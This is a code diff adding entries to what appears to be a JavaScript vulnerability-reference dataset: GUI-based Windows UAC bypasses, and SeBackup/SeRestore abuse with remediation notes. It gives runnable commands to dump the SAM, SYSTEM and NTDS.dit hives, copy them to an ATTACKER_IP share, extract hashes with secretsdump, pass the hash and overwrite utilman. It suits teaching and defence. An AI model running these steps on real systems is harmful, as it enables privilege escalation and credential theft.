@@ -6227,10 +6227,22 @@ var VULNS = [
             ]
           },
           {
+            title: "GUI-based (interactive) bypasses",
+            type: "commands",
+            commands: [
+              { label: "The idea - inherit integrity from an elevated GUI parent", cmd: "# Many signed Microsoft GUI apps auto-elevate to HIGH integrity with no prompt.\n# Any process spawned from INSIDE one is its child and inherits that HIGH integrity.\n# So no registry hijack is needed - you just need a dialog that will launch something.\n# This is the interactive counterpart to the fodhelper/eventvwr registry tricks:\n# more manual, but it writes no HKCU artifacts and is handy over an RDP/console session." },
+              { label: "msconfig Tools tab -> Launch (the canonical GUI bypass)", cmd: "# msconfig.exe (System Configuration) is auto-elevating: at the DEFAULT UAC level it\n# runs at HIGH integrity with no prompt (Process Hacker/Explorer confirm 'High').\n# You must already be in the local Administrators group (filtered medium token).\n# 1) Launch it from Start or the Run dialog:\nmsconfig\n# 2) Go to the Tools tab, select 'Command Prompt', and click Launch.\n# The spawned cmd is a child of msconfig -> inherits its HIGH-IL token, no UAC prompt:\nwhoami /groups   # now shows 'Mandatory Label\\High Mandatory Level'" },
+              { label: "File Open/Save dialog -> spawn cmd (generalises the trick)", cmd: "# The same inherit-the-parent principle works from any auto-elevating app with a\n# standard File dialog - e.g. an MMC snap-in (eventvwr.msc, taskschd.msc, compmgmt.msc)\n#    MMC snap-in (eventvwr.msc, taskschd.msc, compmgmt.msc) or a control-panel\n#    applet that auto-elevates - then open any Open... / Save As... / Browse... dialog.\n# 2) In the dialog's filename or address box, type a shell and press Enter:\ncmd.exe\n%windir%\\system32\\cmd.exe\n# 3) Or set 'Files of type' to 'All Files', then right-click cmd.exe -> Open.\n# The shell launches as a child of the elevated app -> High integrity, no prompt." },
+              { label: "sdclt / Backup-and-Restore wizard (GUI variant)", cmd: "# sdclt.exe auto-elevates. Launch it and step into the Backup wizard until it offers\n# a Browse / folder-selection dialog, then use that dialog's filename/address box to\n# launch cmd.exe exactly as above -> elevated shell (the GUI form of the sdclt bypass)." },
+              { label: "Help / hyperlink pivots", cmd: "# Some elevated applets expose Help or 'Learn more' links that open a browser or a\n# handler at the parent's integrity; from there a file:// path or a right-click Open\n# can reach cmd.exe. Fewer survive on modern builds, but they use the same principle:\n# inherit the elevated parent's token." }
+            ]
+          },
+          {
             title: "Methods by Class",
             type: "table",
             columns: ["Technique / binary", "What it abuses"],
             rows: [
+              ["GUI: msconfig / file-dialog spawn", "An auto-elevating GUI app (msconfig Tools->Launch, or any Open/Save dialog) spawns cmd as a HIGH-integrity child - interactive, no registry write"],
               ["fodhelper.exe / computerdefaults.exe", "HKCU ms-settings\\Shell\\Open\\command handler + empty DelegateExecute"],
               ["eventvwr.exe", "HKCU mscfile\\shell\\open\\command handler"],
               ["sdclt.exe", "HKCU Folder\\shell\\open\\command, or App Paths\\control.exe (sdclt /kickoffelev)"],
@@ -6250,6 +6262,7 @@ var VULNS = [
             columns: ["Mechanism", "Detail"],
             rows: [
               ["Auto-elevation", "Some signed MS binaries elevate with no prompt (autoElevate=true in the manifest)"],
+              ["Child inherits parent IL", "A process spawned from inside an auto-elevated GUI app runs at the parent's High integrity - the basis of the interactive/GUI bypasses"],
               ["HKCU handler hijack", "They read program IDs / handlers from HKCU, which a medium process can write"],
               ["Elevated COM moniker", "Auto-elevating COM interfaces can be created with an admin token and no prompt — fileless"],
               ["Environment-variable hijack", "HKCU\\Environment overrides (%windir%) or CLR profiler vars steer what an elevated process runs/loads"],
@@ -6290,7 +6303,8 @@ var VULNS = [
               { label: "MITRE ATT&CK T1548.002 — Bypass User Account Control", url: "https://attack.mitre.org/techniques/T1548/002/" },
               { label: "UACME — UAC bypass collection (70+ methods)", url: "https://github.com/hfiref0x/UACME" },
               { label: "MITRE ATT&CK T1574.012 — COR_PROFILER", url: "https://attack.mitre.org/techniques/T1574/012/" },
-              { label: "HackTricks — UAC bypass", url: "https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control" }
+              { label: "HackTricks — UAC bypass", url: "https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control" },
+              { label: "Irfan Bhat — Bypassing UAC by GUI-based bypasses (msconfig)", url: "https://medium.com/@irfanbhat3/bypassing-uac-by-gui-based-bypasses-a1a53e8ee8f2" }
             ]
           },
           {
@@ -6298,10 +6312,98 @@ var VULNS = [
             type: "notes",
             items: [
               "Set UAC to the highest level (Always Notify) so even auto-elevating binaries prompt — and prefer that admins log on with a separate account on a PAW rather than elevating from a daily-use session.",
+              "Interactive 'GUI-based' bypasses leave no registry artifact — they spawn a shell from an auto-elevated app's own UI (msconfig's Tools->Launch, an Open/Save dialog). Detect on auto-elevating GUI binaries (msconfig, mmc, sdclt, control-panel applets) spawning cmd/powershell; Always Notify and not running daily as a local admin defeat these as well.",
               "Do not let daily-use accounts be local administrators; with no admin token to unlock, a UAC bypass has nothing to escalate to.",
               "Monitor the attacker-writable locations these methods need: HKCU handler keys (ms-settings, mscfile, Folder/exefile\\shell\\open\\command, the Store AppX key), HKCU\\Environment (windir, COR_PROFILER / COR_ENABLE_PROFILING), and App Paths overrides.",
               "Alert on auto-elevating binaries (fodhelper, computerdefaults, eventvwr, sdclt, slui, wsreset, cmstp) spawning cmd/powershell, on the SilentCleanup task being run interactively by a user, and on elevated COM objects created from a medium-integrity process.",
               "Application allow-listing (WDAC/AppLocker) limits what an elevated child can run, and WDAC's block rules deny several of the signed binaries these chains rely on."
+            ]
+          }
+        ]
+      },
+      {
+        id: "sebackup-serestore",
+        name: "SeBackup / SeRestore Privilege Abuse",
+        severity: "High",
+        ref: "https://attack.mitre.org/techniques/T1003/002/",
+        theory: "theory/2026-10-09-windows-token-potato.html",
+        description: "The backup/restore privileges read and write any file ignoring its DACL — dump the SAM & SYSTEM hives (or NTDS.dit) for offline hash extraction, or overwrite a privileged binary, to reach Administrator/SYSTEM.",
+        brief: "SeBackupPrivilege and SeRestorePrivilege exist so a backup process can copy (and restore) every file on a volume without being granted access to each one — they let a holder open any file with backup/restore intent, bypassing the DACL entirely. Microsoft ships them to Administrators and the Backup Operators group, but they also turn up on service accounts and over-provisioned ops roles.\n\nFor an attacker they are a direct privilege-escalation primitive. SeBackup reads anything: copy the SAM and SYSTEM registry hives (locked while Windows runs, but readable with backup semantics) and extract the local Administrator hash offline — or, on a domain controller, read NTDS.dit for every domain hash. SeRestore writes anything: overwrite a service binary, utilman.exe, or a DLL a SYSTEM process loads. Either one takes a medium-integrity foothold to full local (or domain) compromise without ever touching LSASS.",
+        quickReference: [
+          { label: "Check for the privileges", cmd: "whoami /priv | findstr /i \"SeBackup SeRestore\"" },
+          { label: "Save the SAM & SYSTEM hives (backup semantics)", cmd: "reg save hklm\\sam C:\\Users\\Public\\sam.hive /y\nreg save hklm\\system C:\\Users\\Public\\system.hive /y" },
+          { label: "Extract hashes offline (attacker box)", cmd: "impacket-secretsdump -sam sam.hive -system system.hive LOCAL" },
+          { label: "Use the Administrator hash", cmd: "impacket-psexec -hashes :<NTLM> Administrator@<target>" }
+        ],
+        sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Confirm the privileges are present", cmd: "whoami /priv\n# look for SeBackupPrivilege and/or SeRestorePrivilege (Disabled is fine - they are\n# enabled by the process that uses them; reg.exe and robocopy /b do it for you)" },
+              { label: "2. Dump the local SAM & SYSTEM hives", cmd: "# locked while Windows runs, but readable with backup semantics:\nreg save hklm\\sam    C:\\Users\\Public\\sam.hive    /y\nreg save hklm\\system C:\\Users\\Public\\system.hive /y\n# SeBackup can also copy otherwise-locked files via robocopy's backup mode:\nrobocopy /b C:\\Windows\\System32\\config C:\\Users\\Public SAM SYSTEM" },
+              { label: "3. Exfiltrate the hives to your box", cmd: "# attacker: a quick authenticated SMB share with impacket\nmkdir share\nimpacket-smbserver -smb2support -user u -password p public ./share\n# windows: copy both hives to the share\ncopy C:\\Users\\Public\\sam.hive    \\\\ATTACKER_IP\\public\\\ncopy C:\\Users\\Public\\system.hive \\\\ATTACKER_IP\\public\\" },
+              { label: "4. Extract hashes offline", cmd: "impacket-secretsdump -sam sam.hive -system system.hive LOCAL\n# -> local account NT hashes, including Administrator" },
+              { label: "5. Pass-the-Hash or crack", cmd: "# reuse the Administrator NT hash directly - no cracking needed:\nimpacket-psexec -hashes :<NTLM> Administrator@<target>\nnetexec smb <target> -u Administrator -H <NTLM>\n# or crack it offline:\nhashcat -m 1000 hash.txt rockyou.txt" },
+              { label: "On a Domain Controller - dump every domain hash", cmd: "# SeBackup on a DC reads the AD database; grab NTDS.dit + SYSTEM and secretsdump it:\nreg save hklm\\system C:\\Users\\Public\\system.hive /y\n# NTDS.dit is always locked - copy it via a shadow copy:\ndiskshadow /s script.txt     # script.txt: create + expose shadow, then copy ntds.dit off it\nimpacket-secretsdump -ntds ntds.dit -system system.hive LOCAL" },
+              { label: "SeRestore - write instead of read", cmd: "# SeRestore overwrites any file ignoring its DACL - replace a service binary, a DLL a\n# SYSTEM process loads, or utilman.exe/sethc.exe for a logon-screen SYSTEM shell, then\n# trigger it. Pair with SeBackup to save the original first so you can restore it." }
+            ]
+          },
+          {
+            title: "How It Works",
+            type: "table",
+            columns: ["Element", "Detail"],
+            rows: [
+              ["SeBackupPrivilege", "Open any file for READ with backup intent (FILE_FLAG_BACKUP_SEMANTICS), ignoring the DACL - reg.exe and robocopy /b use it"],
+              ["SeRestorePrivilege", "Open any file for WRITE with restore intent, ignoring the DACL - overwrite privileged binaries/DLLs"],
+              ["Why the hives matter", "SAM holds the local password hashes; SYSTEM holds the boot key that decrypts them - both are needed offline"],
+              ["Who holds them", "Administrators and Backup Operators by default; also seen on backup/service accounts and over-broad ops roles"],
+              ["No LSASS touch", "Reading hives/NTDS.dit from disk avoids opening LSASS - quieter than a memory dump and needs no SeDebug"]
+            ]
+          },
+          {
+            title: "Attack Chain",
+            type: "table",
+            columns: ["Step", "Action", "Result"],
+            rows: [
+              ["1", "whoami /priv shows SeBackup/SeRestore", "A DACL-bypassing read/write primitive"],
+              ["2", "reg save the SAM + SYSTEM hives (or copy NTDS.dit on a DC)", "Credential material on disk"],
+              ["3", "Exfiltrate to the attacker host", "Offline analysis, no noisy tooling on target"],
+              ["4", "secretsdump the hives", "Local Administrator (or every domain) NT hash"],
+              ["5", "Pass-the-Hash / crack", "Administrator or SYSTEM, local or domain-wide"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["reg.exe / robocopy /b", "Copy the locked hives / files using backup semantics"],
+              ["diskshadow / vssadmin", "Shadow-copy a locked NTDS.dit on a domain controller"],
+              ["impacket-secretsdump", "Extract NT hashes from offline SAM+SYSTEM or NTDS.dit+SYSTEM"],
+              ["impacket-smbserver", "Quick SMB share to exfiltrate the hives"],
+              ["impacket-psexec / netexec", "Pass-the-Hash with the recovered Administrator hash"],
+              ["SeBackupPrivilege PowerShell cmdlets", "Toggle the privilege and copy files when reg.exe / robocopy are blocked"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "MITRE ATT&CK T1003.002 — Security Account Manager", url: "https://attack.mitre.org/techniques/T1003/002/" },
+              { label: "Microsoft — Privilege Constants", url: "https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants" },
+              { label: "Priv2Admin — exploiting Windows privileges", url: "https://github.com/gtworek/Priv2Admin" }
+            ]
+          },
+          {
+            title: "Remediation",
+            type: "notes",
+            items: [
+              "Treat SeBackupPrivilege and SeRestorePrivilege as admin-equivalent — grant them only to genuine backup identities, never to interactive or multi-purpose service accounts.",
+              "Audit Backup Operators and any account holding these rights (whoami /priv, or the 'Back up files and directories' / 'Restore files and directories' user-rights assignments in Group Policy).",
+              "On domain controllers these privileges mean the whole domain — tightly restrict who may log on and hold backup rights, and guard NTDS.dit and VSS access.",
+              "Detect reg save of hklm\\sam / hklm\\system, robocopy /b of the config directory, and shadow-copy creation (diskshadow/vssadmin) by non-backup processes.",
+              "Rotate the local Administrator password (LAPS) and, if NTDS.dit may have been read, the krbtgt and account hashes — recovered hashes stay valid until the passwords change."
             ]
           }
         ]
